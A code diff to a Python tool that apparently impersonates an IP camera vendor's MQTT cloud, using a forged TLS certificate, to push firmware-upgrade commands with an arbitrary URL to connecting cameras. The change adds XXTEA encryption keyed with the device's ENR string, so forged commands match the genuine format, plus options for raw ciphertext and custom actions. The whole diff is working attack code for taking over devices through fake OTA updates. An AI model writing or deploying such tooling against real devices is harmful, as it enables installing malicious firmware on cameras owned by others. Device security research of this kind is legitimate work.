@@ -10,6 +10,7 @@ camera's own PUBLISHes are logged and ignored. TLS uses a forged eMudhra leaf (m
       --md5 3753d340855271524cd884b3b72215b1
 """
 import argparse
+import os
 import json
 import socket
 import ssl
@@ -55,13 +56,48 @@ def packet(kind, body, flags=0):
     return bytes([(kind << 4) | flags]) + enc_len(len(body)) + body
 
 
+
+def _xxtea(data, key):
+    n = len(data) // 4
+    if n < 2:
+        return data
+    v = list(struct.unpack("<%dI" % n, data[:n * 4]))
+    k = list(struct.unpack("<4I", (key + b"\0" * 16)[:16]))
+    delta, rounds, total, z = 0x9E3779B9, 6 + 52 // n, 0, v[n - 1]
+    for _ in range(rounds):
+        total = (total + delta) & 0xFFFFFFFF
+        e = (total >> 2) & 3
+        for p in range(n):
+            y = v[(p + 1) % n]
+            mx = (((z >> 5) ^ (y << 2)) + ((y >> 3) ^ (z << 4))) ^ ((total ^ y) + (k[(p & 3) ^ e] ^ z))
+            v[p] = (v[p] + mx) & 0xFFFFFFFF
+            z = v[p]
+    return struct.pack("<%dI" % n, *v)
+
+
+def cmd_body(args, model=None):
+    """The cloud's own command shape, XXTEA-encrypted with the ENR string."""
+    import os, time
+    ver = args.url.rsplit("/", 1)[-1].split(".tar")[0]
+    body = json.dumps({"Action": getattr(args, "action", "upgrade"),
+                       "Params": {"model": model or args.model, "url": args.url,
+                                  "firmware_ver": ver, "md5": args.md5},
+                       "Guid": os.urandom(8).hex(), "Ts": int(time.time() * 1000)},
+                      separators=(",", ":")).encode()
+    if getattr(args, "rawhex", ""):
+        return bytes.fromhex(args.rawhex)
+    key = (args.enr or "").encode()
+    if not key:
+        return body
+    return _xxtea(body + b"\0" * (-len(body) % 4), key)
+
 def handle(conn, addr, args):
     print(f"[{addr}] connect", flush=True)
     kind, body = read_packet(conn)
     if kind is None or kind >> 4 != 1:
         return
     cid = body[12:12 + struct.unpack(">H", body[10:12])[0]].decode(errors="replace")
-    print(f"[{addr}] CONNECT client_id={cid!r}", flush=True)
+    print(f"[{addr}] CONNECT flags={kind:02x} client_id={cid!r}", flush=True)
     conn.sendall(packet(2, b"\x00\x00"))  # CONNACK, session present 0, accepted
 
     while True:
@@ -84,10 +120,7 @@ def handle(conn, addr, args):
                 if addr[0] != "127.0.0.1":
                     args.mac = cmd_topics[0].split("/")[2]
                 args.sub_mac = args.mac.upper()
-                payload = json.dumps({
-                    "cmd": 1234, "sub_mac": args.sub_mac,
-                    "url": args.url, "md5": args.md5, "model": args.model,
-                }).encode()
+                payload = cmd_body(args)
                 topic = f"hl/devices/{args.mac}/cmd".encode()
                 body_out = struct.pack(">H", len(topic)) + topic + struct.pack(">H", 1) + payload
 
@@ -135,7 +168,7 @@ def handle(conn, addr, args):
                             c = cmds[i % len(cmds)]
                             if args.shapes:
                                 args.model = ["HL_CFL", "HL_CAM4"][(i // len(cmds)) % 2]
-                            pl = json.dumps(shape(c, args)).encode()
+                            pl = cmd_body(args)
                             tb = topic.encode() if isinstance(topic, str) else topic
                             bo = struct.pack(">H", len(tb)) + tb + struct.pack(">H", 1) + pl
                             conn.sendall(packet(3, bo, flags=0x02))  # QoS1
@@ -196,6 +229,9 @@ def main():
     ap.add_argument("--cmd", type=int, default=0, help="0 = sweep 1231..1242")
     ap.add_argument("--shapes", action="store_true")
     ap.add_argument("--wrap", nargs="?", const="obj", help="also nest the descriptor under data")
+    ap.add_argument("--enr", default=os.environ.get("OTA_ENR", ""), help="device ENR string (XXTEA key)")
+    ap.add_argument("--rawhex", default="", help="publish this exact ciphertext instead of building one")
+    ap.add_argument("--action", default="upgrade", help="Action name")
     a = ap.parse_args()
 
     ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
